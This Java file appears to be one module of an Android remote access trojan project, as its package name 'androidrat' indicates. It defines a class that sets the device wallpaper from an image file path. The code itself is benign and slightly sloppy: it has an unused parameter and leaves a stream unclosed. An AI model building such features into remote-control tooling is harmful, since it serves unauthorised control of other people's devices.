package com.ot.androidrat;

import android.app.WallpaperManager;
import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.media.Image;

import java.io.BufferedInputStream;
import java.io.FileInputStream;
import java.io.IOException;

public class SetWallpaper {

    String path;
    Context context;

     public SetWallpaper(Context context, String path) {
         this.context = context;
         this.path = path;
     }

    public void changeWallpaper(Image image) throws IOException {
        BufferedInputStream bufferedInputStream = new BufferedInputStream(new FileInputStream(path));
        Bitmap bitmap = Bitmap.createScaledBitmap(BitmapFactory.decodeStream(bufferedInputStream), WallpaperManager.getInstance(this.context).getDesiredMinimumWidth(), WallpaperManager.getInstance(this.context).getDesiredMinimumHeight(), true);
        WallpaperManager.getInstance(this.context).setBitmap(bitmap);
    }
}
